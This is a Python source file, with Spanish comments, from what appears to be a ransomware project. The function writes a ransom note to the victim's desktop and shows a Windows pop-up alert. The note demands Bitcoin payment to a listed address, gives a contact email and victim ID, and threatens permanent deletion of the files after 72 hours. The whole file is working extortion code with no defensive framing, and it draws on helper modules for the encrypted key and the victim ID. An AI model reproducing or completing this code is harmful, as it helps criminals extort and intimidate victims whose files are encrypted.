import os
import ctypes
from decrypt import load_aes_key_encrypted
import base64
import agent 

def show_ransom_note():
    """Crea una nota de rescate en el escritorio y muestra un pop-up de advertencia."""
    
    # Obtener la ruta del escritorio de forma dinámica
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    aes_key_encrypted = load_aes_key_encrypted()
    aes_key_encrypted_b64 = base64.b64encode(aes_key_encrypted).decode()
    aes_key_formatted = "\n".join([aes_key_encrypted_b64[i:i+64] for i in range(0, len(aes_key_encrypted_b64), 64)])
    victim_id = agent.get_agent_id()

    # Contenido de la nota de rescate
    note = f"""===========================
    ¡TUS ARCHIVOS HAN SIDO CIFRADOS!
===========================

Todos tus documentos, imágenes, bases de datos y otros archivos importantes han sido cifrados **AES-CBC** de **256 bits**.
No puedes acceder a ellos ni recuperarlos sin nuestra ayuda.

----------------------------
 ¿CÓMO RECUPERAR TUS ARCHIVOS?
----------------------------
1. Envíanos el pago en Bitcoin (BTC) a la siguiente dirección:
   1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

2. Envía un correo a recoveryourfiles@genaixciphers.com con el comprobante de pago y tu ID de víctima:
   ID DE VÍCTIMA: {victim_id}

3. Una vez confirmado el pago, recibirás la clave y el software de descifrado.

----------------------------
 ¡ADVERTENCIAS!
----------------------------
- No intentes modificar o recuperar archivos por tu cuenta. 
- Cualquier intento de descifrado sin nuestra clave puede dañar los archivos de manera irreversible.
- Si el pago no se realiza en 72 horas, los archivos serán eliminados permanentemente.

----------------------------
  INFORMACIÓN SOBRE TU CLAVE 
----------------------------
- Tu clave de descifrado está protegida y cifrada de manera segura.
- Aquí tienes la versión cifrada de tu clave (NO INTENTES MODIFICARLA):

{aes_key_formatted}

Atentamente, 
GenAIx Ciphers
"""

    # Ruta donde se guardará la nota de rescate
    note_path = os.path.join(desktop, "README_IMPORTANTE.txt")

    # Guardar la nota en un archivo de texto en el escritorio
    with open(note_path, "w") as archivo:
        archivo.write(note)

    # Mostrar un mensaje emergente usando MessageBox de Windows
    ctypes.windll.user32.MessageBoxW(0, "¡Tus archivos han sido cifrados! Lee el archivo README_IMPORTANTE.txt en tu escritorio.", 
                                     "ALERTA DE SEGURIDAD", 0x10 | 0x1)





